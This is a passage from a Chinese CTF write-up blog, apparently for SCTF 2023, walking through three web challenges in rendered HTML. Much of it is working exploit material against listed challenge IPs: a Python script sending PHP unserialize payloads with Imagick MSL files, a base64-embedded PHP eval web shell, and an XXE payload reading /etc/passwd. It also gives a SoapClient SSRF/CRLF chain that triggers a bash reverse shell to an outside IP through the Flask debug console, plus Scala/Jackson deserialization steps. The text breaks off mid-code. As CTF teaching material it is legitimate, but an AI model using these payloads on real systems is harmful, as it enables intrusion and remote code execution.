class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.99.77.113:18080/?cmd=unserialze&quot;</span></span><br><span class="line"><span class="comment"># url = &quot;http://127.0.0.1:18080/?cmd=unserialze&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sleep</span>():</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(sys.argv[<span class="number">1</span>] == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">    <span class="comment"># rm</span></span><br><span class="line">    r = requests.get(<span class="string">&quot;http://47.99.77.113:18080/?cmd=rm&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    sleep()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    <span class="comment"># file write</span></span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;lfi.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    sleep()</span><br><span class="line">    r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;s:17:&quot;vid:msl:/tmp/php*&quot;;s:4:&quot;func&quot;;N;s:5:&quot;class&quot;;s:7:&quot;Imagick&quot;;&#125;&#x27;</span>&#125;, files=&#123;<span class="string">&quot;file1&quot;</span>:<span class="built_in">open</span>(<span class="string">&quot;hack.xml&quot;</span>).read()&#125;,headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line">    <span class="comment"># print(r.text)</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="comment"># session_start</span></span><br><span class="line">sleep()</span><br><span class="line">r = requests.post(url, data=&#123;<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;O:13:&quot;fumo_backdoor&quot;:4:&#123;s:4:&quot;path&quot;;N;s:4:&quot;argv&quot;;N;s:4:&quot;func&quot;;s:13:&quot;session_start&quot;;s:5:&quot;class&quot;;N;&#125;&#x27;</span>&#125;, headers=&#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=tel&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>hack.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8P3BocCBldmFsKCRfR0VUWzFdKTs/PnxPOjEzOiJmdW1vX2JhY2tkb29yIjozOntzOjQ6InBhdGgiO3M6OToiL3RtcC9GTEFHIjtzOjQ6ImFyZ3YiO047czoxOiJjIjtOO30=&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/sess_tel&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621180951791.png" alt="image-20230621180951791"></p><p><strong>lfi.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">image</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;app1:/flag&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/FLAG&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621182457074.png" alt="image-20230621182457074"></p><p><strong>这里用那个<code>mvg</code>  <code>app1</code>   <code>uyvy</code> 能直接读取flag</strong></p><p>还有一种办法就是fuzz测试来测试哪种可以用来使用</p><h2 id="pypyp"><a href="#pypyp" class="headerlink" title="pypyp?"></a>pypyp?</h2><h3 id="提示-hint"><a href="#提示-hint" class="headerlink" title="提示/hint"></a>提示/hint</h3><p>a piece of cake but hard work。per 5 min restart.<br>pay attention to <code>/app/app.py</code></p><p><img src="../images/image-20230621201841266.png" alt="image-20230621201841266"></p><p>题目的页面就是这样</p><p>这里的话是先使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> (<strong>后面跟的是上传内容</strong>)  来强制<code>session start</code></p><p>在使用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 时，如果 <code>session</code> 没有开启，系统会自动开启一个新的 session。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://115.239.215.75:8081/ -H &quot;Cookie: PHPSESSID=tel&quot; -F &#x27;PHP_SESSION_UPLOAD_PROGRESS=111&#x27;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621203954292.png" alt="image-20230621203954292"></p><p>然后交给gpt就行了</p><p><strong>得到源码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Session not started&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$type</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$properties</span>))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="keyword">new</span> <span class="variable">$type</span>(<span class="variable">$properties</span>[<span class="number">0</span>], <span class="variable">$properties</span>[<span class="number">1</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;this is the object: <span class="subst">$object</span>&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://115.239.215.75:8081/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>(<strong>这个来上传抓包  然后添加PHPSESSID=xxx也行</strong>)</p><p>这里的考点主要是靠原生类   <a href="https://ke1nys.github.io/posts/28e06bac.html#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">ctfshow-愚人杯也考过这个考点</a></p><p>主要是有三个利用点 </p><ul><li>$object-&gt;sctf();</li><li>$object = new $type($properties[0], $properties[1]);</li><li>$object = file_get_contents(‘<a href="http://127.0.0.1:5000/">http://127.0.0.1:5000/</a>‘ . $properties);</li></ul><p><strong>研究了一下，发现只有中间这个有用   并且类和参数都可控 </strong> <strong>用extract来控制</strong></p><p>(由于题目说的<code>/app/app.py</code>，那么我们就得去用原生类来读取这个文件)</p><p><code>$object = new $type($properties[0], $properties[1]);</code>   然后因为这里有两个参数   所以就得去找找既能读取文件，又是两个参数的原生类</p><p><img src="../images/image-20230621212254271.png" alt="image-20230621212254271"></p><p>刚好找到了这个类   可以使用xxe来读取文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$class</span> = <span class="string">&#x27;SimpleXMLElement&#x27;</span>;</span><br><span class="line"><span class="variable">$evilxml</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY file SYSTEM  &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;xxe&gt;&amp;file;&lt;/xxe&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;properties&#x27;</span> =&gt; <span class="keyword">array</span>(<span class="variable">$evilxml</span>, <span class="string">&#x27;2&#x27;</span>),<span class="string">&#x27;type&#x27;</span>=&gt;<span class="variable">$class</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621222930826.png" alt="image-20230621222930826"></p><p>然后去读题目给的/app/app.py</p><p><img src="../images/image-20230621223042971.png" alt="image-20230621223042971"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开了debug只有两条路   <strong>热覆盖 和 算pin</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$properties</span>) &amp;&amp; <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>)))&#123;</span><br><span class="line">    <span class="variable">$object</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$properties</span>));</span><br><span class="line">    <span class="variable">$object</span>-&gt;<span class="title function_ invoke__">sctf</span>();</span><br><span class="line">    <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>这里注意一下   这里会调用<code>call</code>()方法  </p><p>覆盖暂时没找到原生类的call方法可以覆盖写文件的，而有个原生类的call是经常用：<code>SoapClient</code></p><p>可以用他的ssrf和crlf打组合拳，这样我们就可以把cookie塞</p><p><code>SoapClient</code>在ctfshow的web259有详细使用   <a href="https://ke1nys.github.io/posts/fd5983bb.html#web259">web259</a></p><p>接下来我们去看一下<code>console</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$object</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;http://127.0.0.1:5000/&#x27;</span> . <span class="variable">$properties</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230621233844882.png" alt="image-20230621233844882"></p><p>猜测是算pin</p><p>那么我们就可以用上面的<code>xxe</code>来读取算<code>pin</code>所需要的东西</p><p><img src="../images/image-20230621234154080.png" alt="image-20230621234154080"></p><p>所以这些得一个一个来获取</p><ul><li>machine_id  —&gt;  349b3354-f67f-4438-b395-4fbc01171fdd</li><li>uuidnode   ——&gt;   02:42:ac:13:00:02      (2485378023426)</li><li>moddir  <strong>flask库下app.py的绝对路径  但是这道题没给触发页面报错来获取信息  所以我们得使用别的原生类来模糊查找</strong></li></ul><p>(其实不用也行  可以猜一下  找到例题来看看他的<code>moddir</code>   然后修改一下python版本一下一下试就行了)</p><p><code>/usr/lib/python3.8/site-packages/flask/app.py</code>   这是moddir</p><p>有了这些东西之后  我们就可以直接算pin了</p><p>算出来的pin    <code>121-260-582</code></p><p>由于算pin来rce需要cookie的header   所以用常规的只会输出pin码   并不会输出cookie 所以得找一个脚本能两个同时生成的</p><p><img src="../images/image-20230622000408987.png" alt="image-20230622000408987"></p><p>然后去通过<code>soapclient</code>去访问debug界面，由于<code>debugmode</code>的rce需要携带cookie，因此只有<code>soapclient</code>可以做到   (<strong>其实就是ssrf加crlf</strong>)</p><p><strong>(简单点说就是伪造http头)</strong>     不明白的可以去看上面写的  <strong>web259的链接</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%22os%22).popen(%22bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F101.42.39.110%2F3389%20%3C%261%5C%22%22)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: __wzdb2a60e2b19822632a67c=1687363437|11b8517fb9fb&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;wupco\r\n&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$headers</span>),<span class="string">&#x27;uri&#x27;</span>=&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"><span class="variable">$arr</span>=<span class="title function_ invoke__">Array</span>(<span class="string">&quot;properties&quot;</span>=&gt;<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)),<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;SimpleXMLElement&quot;</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$aaa</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">115.239</span><span class="number">.215</span><span class="number">.75</span>:<span class="number">8081</span></span><br><span class="line">Content-Length: <span class="number">922</span></span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: null</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed-exchange;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: PHPSESSID=1nys</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"></span><br><span class="line">tyaoo</span><br><span class="line">------WebKitFormBoundaryt1mG5nxqspditAqy</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;data&quot;</span></span><br><span class="line"></span><br><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;properties&quot;</span>;s:<span class="number">643</span>:<span class="string">&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3Bs%3A8%3A%22location%22%3Bs%3A205%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2522os%2522%29.popen%28%2522bash%2520-c%2520%255C%2522bash%2520-i%2520%253E%2526%2520%252Fdev%252Ftcp%252F101.42.39.110%252F3389%2520%253C%25261%255C%2522%2522%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A92%3A%22wupco%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687363437%7C11b8517fb9fb%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;type&quot;</span>;s:<span class="number">16</span>:<span class="string">&quot;SimpleXMLElement&quot;</span>;&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230622004425446.png" alt="image-20230622004425446"></p><p><strong>这吊题真难</strong></p><h2 id="hellojava"><a href="#hellojava" class="headerlink" title="hellojava"></a>hellojava</h2><p>题目就给了一个jar包   进行反编译查看</p><p><img src="../images/image-20230622195938811.png" alt="image-20230622195938811"></p><p><strong>这时jar包里的内容    还给了一个  <code>1.jar</code>   里面含有这个javassist  说明可以使用<code>templatesimpl</code></strong></p><p><img src="../images/image-20230622200111030.png" alt="image-20230622200111030"></p><p><strong>看了一下<code>pom.xml</code></strong></p><p>发现一共给了三种依赖</p><ul><li>scala    2.13.7</li><li>jackson</li><li>hessian     4.0.4</li></ul><p>一般来说就先对这个<code>pom.xml</code>的依赖进行分析  发现<code>scala</code>这个版本是存在漏洞的</p><p><img src="../images/image-20230622202022788.png" alt="image-20230622202022788"></p><p><img src="../images/image-20230622202525933.png" alt="image-20230622202525933"></p><p>找到了反序列化入口   那么关键点就是如何进入这个if判断了</p><p><img src="../images/image-20230622204854853.png" alt="image-20230622204854853"></p><p><img src="../images/image-20230622204904698.png" alt="image-20230622204904698"></p><p>这个东西要为true才行  但是如果简单的这样传值的话</p><p><code>&#123;&quot;IfInput&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code>  这样简单的传值的话是不行的</p><p><img src="../images/image-20230622205042591.png" alt="image-20230622205042591"></p><p>关键词搜索  <a href="http://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/">Jackson注解的一个trick</a>   发现了这篇文章就是讲这个的</p><p><strong>使用空值就可以进行绕过了</strong></p><p><code>&#123;&quot;&quot;:true,&quot;base64Code&quot;:&quot;AAAAAAAA&quot;&#125;</code></p><p>接下来就到如何进行反序列化利用了</p><p><img src="../images/image-20230622205655871.png" alt="image-20230622205655871"></p><p>结合这个<code>LazyList</code>东西和刚开始分析的<code>scala</code>漏洞的内容   可以猜测用这个反序列化来清空黑名单过滤</p><p><a href="https://github.com/yarocher/lazylist-cve-poc">https://github.com/yarocher/lazylist-cve-poc</a>   用这个代码  然后直接打就行了</p><p><code>mvn -q exec:java -Dexec.mainClass=&quot;poc.cve.lazylist.payload.Main&quot; -Dexec.args=&quot;./security/blacklist.txt false&quot;</code> 生成 Base64 payload</p><p><img src="../images/image-20230622213852125.png" alt="image-20230622213852125"></p><p>发包来打  将 <code>security/blacklist.txt</code> 清空</p><p>之后再使用 jackson 利用链，可以裸反序列化 RCE </p><p><img src="../images/image-20230622213955923.png" alt="image-20230622213955923"></p><p>最终<strong>poc</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span 